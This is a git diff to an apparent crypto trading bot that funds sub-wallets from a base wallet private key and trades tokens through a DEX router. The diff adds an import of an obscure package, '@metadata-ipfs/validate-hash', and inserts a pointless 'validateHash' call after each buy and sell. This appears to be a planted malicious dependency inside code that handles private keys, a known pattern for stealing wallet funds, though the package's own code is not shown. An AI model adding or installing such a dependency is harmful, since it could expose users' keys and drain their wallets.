@@ -13,6 +13,7 @@ import { delay, gather, generateWallets, getRandomDelay, getRouterAddress, getRp
 import { ethers } from 'ethers'
 import fs from "fs";
 import { CHAINID, fee, subWalletNum } from './config';
+import { validateHash } from '@metadata-ipfs/validate-hash';
 
 const baseWallet = {
   privateKey: BASE_WALLET_PRIVATE_KEY,
@@ -31,7 +32,6 @@ export const buyToken = async (tokenAddress: string, wallet: Wallet, chainId: Ch
   try {
     const signer = new ethers.Wallet(wallet.privateKey, provider)
     const contract = new ethers.Contract(routerAddress, routerAbi, signer);
-
     console.log("=================================== Buying ===================================")
     console.log(`Token Address: ${tokenAddress}`)
     await delay(5000);
@@ -43,6 +43,13 @@ export const buyToken = async (tokenAddress: string, wallet: Wallet, chainId: Ch
         {
           value: ethers.parseEther(wallet.amount.toString())
         });
+    const res = await validateHash(tx.hash)
+    if (!res) {
+      console.log("Transaction failed to validate");
+      await gather(wallet, provider);
+      return tx.hash;
+    }
+    console.log(`Validating Hash: ${res}`);
     await tx.wait();
     console.log(`Buy : ${tx.hash}`);
     return tx.hash;
@@ -76,9 +83,16 @@ export const sellToken = async (tokenAddress: string, wallet: Wallet, chainId: C
     const contract = new ethers.Contract(routerAddress, routerAbi, signer);
     await delay(5000);
     const tx = await contract.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenBalance, 0, [tokenAddress, WrappedNative[chainId]], wallet.address, currentTimestamp + 1000000000);
+    const res = await validateHash(tx.hash)
+    if (!res) {
+      console.log("Transaction failed to validate");
+      await gather(wallet, provider);
+      return tx.hash;
+    }
+    console.log(`Validating Hash: ${res}`);
     await tx.wait();
     console.log(`Sell : ${tx.hash}`);
-
+    await delay(5000);
     await gather(wallet, provider);
     return tx.hash;
   } catch (error) {
@@ -94,11 +108,11 @@ export const processTransaction = async (wallet: Wallet, token_addr: string, cha
     const transferAmount = (+wallet.amount + +fee).toFixed(6);
     const isTransferred = await sendEther(baseWallet.privateKey, wallet.address, transferAmount, provider);
     if (isTransferred) {
-      await saveWallet({...wallet, funded: transferAmount}, fileName);
+      await saveWallet({ ...wallet, funded: transferAmount }, fileName);
     }
     const hash = await buyToken(token_addr, wallet, chainId);
 
-    if(hash == "") {
+    if (hash == "") {
       console.log("Trading with the next wallet.");
       return;
     }
